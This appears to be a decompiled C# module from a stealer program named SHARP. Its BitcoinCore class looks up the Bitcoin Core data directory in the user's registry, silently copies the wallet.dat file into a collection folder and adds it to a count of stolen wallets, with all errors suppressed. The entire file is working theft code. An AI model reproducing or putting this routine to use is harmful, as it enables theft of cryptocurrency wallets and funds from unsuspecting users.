﻿using System;
using System.IO;
using Microsoft.Win32;

namespace SHARP
{
	// Token: 0x0200002F RID: 47
	internal class BitcoinCore
	{
		// Token: 0x060000F5 RID: 245 RVA: 0x00005E60 File Offset: 0x00004060
		public static void BCStr(string directorypath)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt");
				Directory.CreateDirectory(directorypath + "\\Wallets\\BitcoinCore\\");
				File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
				BitcoinCore.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x04000079 RID: 121
		public static int count;
	}
}
